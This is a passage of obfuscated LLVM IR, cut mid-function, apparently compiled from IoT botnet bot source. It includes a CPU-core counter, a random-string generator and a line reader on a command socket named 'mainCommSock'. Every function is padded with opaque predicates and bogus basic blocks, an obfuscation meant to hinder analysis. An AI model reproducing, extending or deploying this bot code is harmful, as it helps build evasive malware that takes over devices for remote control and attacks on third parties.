  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %22

; <label>:74:                                     ; preds = %53
  %75 = load i32, i32* @x.33
  %76 = load i32, i32* @y.34
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %74
  %83 = load i32, i32* @x.33
  %84 = load i32, i32* @y.34
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %91

; <label>:91:                                     ; preds = %143, %originalBBpart28
  %92 = load i32, i32* @x.33
  %93 = load i32, i32* @y.34
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %91
  %100 = load i8*, i8** %6, align 8
  %101 = load i8*, i8** %6, align 8
  %102 = call i64 @strlen(i8* %101) #10
  %103 = sub i64 %102, 1
  %104 = getelementptr inbounds i8, i8* %100, i64 %103
  %105 = load i8, i8* %104, align 1
  %106 = zext i8 %105 to i32
  %107 = icmp eq i32 %106, 13
  %108 = load i32, i32* @x.33
  %109 = load i32, i32* @y.34
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart227, label %originalBB10alteredBB

originalBBpart227:                                ; preds = %originalBB10
  br i1 %107, label %125, label %116

; <label>:116:                                    ; preds = %originalBBpart227
  %117 = load i8*, i8** %6, align 8
  %118 = load i8*, i8** %6, align 8
  %119 = call i64 @strlen(i8* %118) #10
  %120 = sub i64 %119, 1
  %121 = getelementptr inbounds i8, i8* %117, i64 %120
  %122 = load i8, i8* %121, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 10
  br label %125

; <label>:125:                                    ; preds = %116, %originalBBpart227
  %126 = phi i1 [ true, %originalBBpart227 ], [ %124, %116 ]
  %127 = load i32, i32* @x.33
  %128 = load i32, i32* @y.34
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %125
  %135 = load i32, i32* @x.33
  %136 = load i32, i32* @y.34
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %126, label %143, label %149

; <label>:143:                                    ; preds = %originalBBpart231
  %144 = load i8*, i8** %6, align 8
  %145 = load i8*, i8** %6, align 8
  %146 = call i64 @strlen(i8* %145) #10
  %147 = sub i64 %146, 1
  %148 = getelementptr inbounds i8, i8* %144, i64 %147
  store i8 0, i8* %148, align 1
  br label %91

; <label>:149:                                    ; preds = %originalBBpart231
  %150 = load i8*, i8** %6, align 8
  %151 = call i8* @strchr(i8* %150, i32 46) #10
  %152 = icmp ne i8* %151, null
  br i1 %152, label %153, label %172

; <label>:153:                                    ; preds = %149
  %154 = load i32, i32* @x.33
  %155 = load i32, i32* @y.34
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %153
  %162 = load i8*, i8** %6, align 8
  %163 = call i8* @strchr(i8* %162, i32 46) #10
  store i8 0, i8* %163, align 1
  %164 = load i32, i32* @x.33
  %165 = load i32, i32* @y.34
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %172

; <label>:172:                                    ; preds = %originalBBpart235, %149
  %173 = load i32, i32* @x.33
  %174 = load i32, i32* @y.34
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %172
  %181 = load i8*, i8** %3, align 8
  %182 = load i8*, i8** %6, align 8
  %183 = call i8* @strcpy(i8* %181, i8* %182) #2
  %184 = load i32, i32* %4, align 4
  %185 = call i32 @close(i32 %184)
  store i32 0, i32* %2, align 4
  %186 = load i32, i32* @x.33
  %187 = load i32, i32* @y.34
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %199

; <label>:194:                                    ; preds = %13
  %195 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %195, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:196:                                    ; preds = %8
  %197 = load i32, i32* %4, align 4
  %198 = call i32 @close(i32 %197)
  store i32 1, i32* %2, align 4
  br label %199

; <label>:199:                                    ; preds = %196, %originalBBpart239
  %200 = load i32, i32* @x.33
  %201 = load i32, i32* @y.34
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %199
  %208 = load i32, i32* %2, align 4
  %209 = load i32, i32* @x.33
  %210 = load i32, i32* @y.34
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  ret i32 %208

originalBBalteredBB:                              ; preds = %originalBB, %22
  %217 = load i8*, i8** %6, align 8
  %218 = load i8, i8* %217, align 1
  %219 = zext i8 %218 to i32
  %220 = icmp eq i32 %219, 32
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %55
  %221 = load i8*, i8** %6, align 8
  %222 = getelementptr inbounds i8, i8* %221, i32 1
  store i8* %222, i8** %6, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %74
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %91
  %223 = load i8*, i8** %6, align 8
  %224 = load i8*, i8** %6, align 8
  %225 = call i64 @strlen(i8* %224) #10
  %_ = sub i64 0, %225
  %gen = add i64 %_, 1
  %_11 = sub i64 %225, 1
  %gen12 = mul i64 %_11, 1
  %_13 = sub i64 %225, 1
  %gen14 = mul i64 %_13, 1
  %_15 = sub i64 %225, 1
  %gen16 = mul i64 %_15, 1
  %_17 = sub i64 %225, 1
  %gen18 = mul i64 %_17, 1
  %_19 = sub i64 %225, 1
  %gen20 = mul i64 %_19, 1
  %_21 = sub i64 %225, 1
  %gen22 = mul i64 %_21, 1
  %_23 = sub i64 0, %225
  %gen24 = add i64 %_23, 1
  %226 = sub i64 %225, 1
  %227 = getelementptr inbounds i8, i8* %223, i64 %226
  %228 = load i8, i8* %227, align 1
  %229 = zext i8 %228 to i32
  %230 = icmp eq i32 %229, 13
  br label %originalBB10

originalBB29alteredBB:                            ; preds = %originalBB29, %125
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %153
  %231 = load i8*, i8** %6, align 8
  %232 = call i8* @strchr(i8* %231, i32 46) #10
  store i8 0, i8* %232, align 1
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %172
  %233 = load i8*, i8** %3, align 8
  %234 = load i8*, i8** %6, align 8
  %235 = call i8* @strcpy(i8* %233, i8* %234) #2
  %236 = load i32, i32* %4, align 4
  %237 = call i32 @close(i32 %236)
  store i32 0, i32* %2, align 4
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %199
  %238 = load i32, i32* %2, align 4
  br label %originalBB41
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = load i32, i32* @x.35
  %2 = load i32, i32* @y.36
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [4096 x i8], align 16
  store i32 0, i32* %9, align 4
  %12 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.132, i32 0, i32 0), i32 0)
  store i32 %12, i32* %10, align 4
  %13 = load i32, i32* @x.35
  %14 = load i32, i32* @y.36
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %21

; <label>:21:                                     ; preds = %51, %originalBBpart2
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i32 0, i32 0
  %23 = load i32, i32* %10, align 4
  %24 = call i8* @fdgets(i8* %22, i32 4096, i32 %23)
  %25 = icmp ne i8* %24, null
  br i1 %25, label %26, label %53

; <label>:26:                                     ; preds = %21
  %27 = load i32, i32* @x.35
  %28 = load i32, i32* @y.36
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %26
  %35 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i32 0, i32 0
  call void @uppercase(i8* %35)
  %36 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i32 0, i32 0
  %37 = call i8* @strstr(i8* %36, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.133, i32 0, i32 0)) #10
  %38 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i32 0, i32 0
  %39 = icmp eq i8* %37, %38
  %40 = load i32, i32* @x.35
  %41 = load i32, i32* @y.36
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %39, label %48, label %51

; <label>:48:                                     ; preds = %originalBBpart24
  %49 = load i32, i32* %9, align 4
  %50 = add nsw i32 %49, 1
  store i32 %50, i32* %9, align 4
  br label %51

; <label>:51:                                     ; preds = %48, %originalBBpart24
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %52, i8 0, i64 4096, i32 16, i1 false)
  br label %21

; <label>:53:                                     ; preds = %21
  %54 = load i32, i32* @x.35
  %55 = load i32, i32* @y.36
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %53
  %62 = load i32, i32* %10, align 4
  %63 = call i32 @close(i32 %62)
  %64 = load i32, i32* %9, align 4
  %65 = load i32, i32* @x.35
  %66 = load i32, i32* @y.36
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %64

originalBBalteredBB:                              ; preds = %originalBB, %0
  %73 = alloca i32, align 4
  %74 = alloca i32, align 4
  %75 = alloca [4096 x i8], align 16
  store i32 0, i32* %73, align 4
  %76 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.132, i32 0, i32 0), i32 0)
  store i32 %76, i32* %74, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %26
  %77 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i32 0, i32 0
  call void @uppercase(i8* %77)
  %78 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i32 0, i32 0
  %79 = call i8* @strstr(i8* %78, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.133, i32 0, i32 0)) #10
  %80 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i32 0, i32 0
  %81 = icmp eq i8* %79, %80
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %53
  %82 = load i32, i32* %10, align 4
  %83 = call i32 @close(i32 %82)
  %84 = load i32, i32* %9, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %originalBBpart2, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %38

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* @x.37
  %21 = load i32, i32* @y.38
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  %30 = load i32, i32* @x.37
  %31 = load i32, i32* @y.38
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %6

; <label>:38:                                     ; preds = %6
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %19
  %39 = load i32, i32* %5, align 4
  %_ = sub i32 0, %39
  %gen = add i32 %_, 1
  %_1 = sub i32 0, %39
  %gen2 = add i32 %_1, 1
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %5, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  br i1 %48, label %49, label %136

; <label>:49:                                     ; preds = %33
  %50 = load i32, i32* @x.39
  %51 = load i32, i32* @y.40
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %49
  %58 = load i32, i32* @x.39
  %59 = load i32, i32* @y.40
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %66

; <label>:66:                                     ; preds = %originalBBpart210, %originalBBpart2
  %67 = load i32, i32* @x.39
  %68 = load i32, i32* @y.40
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %66
  %75 = load i32, i32* %13, align 4
  %76 = icmp slt i32 %75, 10
  %77 = load i32, i32* @x.39
  %78 = load i32, i32* @y.40
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %76, label %85, label %135

; <label>:85:                                     ; preds = %originalBBpart24
  %86 = load i32, i32* @mainCommSock, align 4
  %87 = call i32 (i32, i8*, ...) @sockprintf(i32 %86, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i32 0, i32 0))
  %88 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %88, align 8
  %89 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %89, align 8
  br label %90

; <label>:90:                                     ; preds = %85
  %91 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %92 = getelementptr inbounds [16 x i64], [16 x i64]* %91, i64 0, i64 0
  %93 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %92) #2, !srcloc !2
  %94 = extractvalue { i64, i64* } %93, 0
  %95 = extractvalue { i64, i64* } %93, 1
  %96 = trunc i64 %94 to i32
  store i32 %96, i32* %14, align 4
  %97 = ptrtoint i64* %95 to i64
  %98 = trunc i64 %97 to i32
  store i32 %98, i32* %15, align 4
  br label %99

; <label>:99:                                     ; preds = %90
  %100 = load i32, i32* %5, align 4
  %101 = srem i32 %100, 64
  %102 = zext i32 %101 to i64
  %103 = shl i64 1, %102
  %104 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %105 = load i32, i32* %5, align 4
  %106 = sdiv i32 %105, 64
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds [16 x i64], [16 x i64]* %104, i64 0, i64 %107
  %109 = load i64, i64* %108, align 8
  %110 = or i64 %109, %103
  store i64 %110, i64* %108, align 8
  %111 = load i32, i32* %5, align 4
  %112 = add nsw i32 %111, 1
  %113 = call i32 @select(i32 %112, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %113, i32* %12, align 4
  %114 = icmp sle i32 %113, 0
  br i1 %114, label %115, label %134

; <label>:115:                                    ; preds = %99
  %116 = load i32, i32* @x.39
  %117 = load i32, i32* @y.40
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %115
  %124 = load i32, i32* %13, align 4
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %13, align 4
  %126 = load i32, i32* @x.39
  %127 = load i32, i32* @y.40
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart210, label %originalBB6alteredBB

originalBBpart210:                                ; preds = %originalBB6
  br label %66

; <label>:134:                                    ; preds = %99
  br label %135

; <label>:135:                                    ; preds = %134, %originalBBpart24
  br label %136

; <label>:136:                                    ; preds = %135, %33
  store i32 0, i32* %18, align 4
  %137 = load i8*, i8** %6, align 8
  store i8* %137, i8** %17, align 8
  br label %138

; <label>:138:                                    ; preds = %originalBBpart219, %136
  %139 = load i32, i32* %7, align 4
  %140 = add nsw i32 %139, -1
  store i32 %140, i32* %7, align 4
  %141 = icmp sgt i32 %139, 1
  br i1 %141, label %142, label %191

; <label>:142:                                    ; preds = %138
  %143 = load i32, i32* @mainCommSock, align 4
  %144 = call i64 @recv(i32 %143, i8* %16, i64 1, i32 0)
  %145 = icmp ne i64 %144, 1
  br i1 %145, label %146, label %164

; <label>:146:                                    ; preds = %142
  %147 = load i32, i32* @x.39
  %148 = load i32, i32* @y.40
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %146
  %155 = load i8*, i8** %17, align 8
  store i8 0, i8* %155, align 1
  store i32 -1, i32* %4, align 4
  %156 = load i32, i32* @x.39
  %157 = load i32, i32* @y.40
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br label %210

; <label>:164:                                    ; preds = %142
  %165 = load i8, i8* %16, align 1
  %166 = load i8*, i8** %17, align 8
  %167 = getelementptr inbounds i8, i8* %166, i32 1
  store i8* %167, i8** %17, align 8
  store i8 %165, i8* %166, align 1
  %168 = load i8, i8* %16, align 1
  %169 = zext i8 %168 to i32
  %170 = icmp eq i32 %169, 10
  br i1 %170, label %171, label %172

; <label>:171:                                    ; preds = %164
  br label %191

; <label>:172:                                    ; preds = %164
  %173 = load i32, i32* @x.39
  %174 = load i32, i32* @y.40
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %172
  %181 = load i32, i32* %18, align 4
  %182 = add nsw i32 %181, 1
  store i32 %182, i32* %18, align 4
  %183 = load i32, i32* @x.39
  %184 = load i32, i32* @y.40
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart219, label %originalBB16alteredBB

originalBBpart219:                                ; preds = %originalBB16
  br label %138

; <label>:191:                                    ; preds = %171, %138
  %192 = load i32, i32* @x.39
  %193 = load i32, i32* @y.40
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %191
  %200 = load i8*, i8** %17, align 8
  store i8 0, i8* %200, align 1
  %201 = load i32, i32* %18, align 4
  store i32 %201, i32* %4, align 4
  %202 = load i32, i32* @x.39
  %203 = load i32, i32* @y.40
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %210

; <label>:210:                                    ; preds = %originalBBpart223, %originalBBpart214
  %211 = load i32, i32* %4, align 4
  ret i32 %211

originalBBalteredBB:                              ; preds = %originalBB, %49
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %66
  %212 = load i32, i32* %13, align 4
  %213 = icmp slt i32 %212, 10
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %115
  %214 = load i32, i32* %13, align 4
  %_ = sub i32 %214, 1
  %gen = mul i32 %_, 1
  %_7 = sub i32 0, %214
  %gen8 = add i32 %_7, 1
  %215 = add nsw i32 %214, 1
  store i32 %215, i32* %13, align 4
  br label %originalBB6

originalBB12alteredBB:                            ; preds = %originalBB12, %146
  %216 = load i8*, i8** %17, align 8
  store i8 0, i8* %216, align 1
  store i32 -1, i32* %4, align 4
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %172
  %217 = load i32, i32* %18, align 4
  %_17 = shl i32 %217, 1
  %218 = add nsw i32 %217, 1
  store i32 %218, i32* %18, align 4
  br label %originalBB16

originalBB21alteredBB:                            ; preds = %originalBB21, %191
  %219 = load i8*, i8** %17, align 8
  store i8 0, i8* %219, align 1
  %220 = load i32, i32* %18, align 4
  store i32 %220, i32* %4, align 4
  br label %originalBB21
}

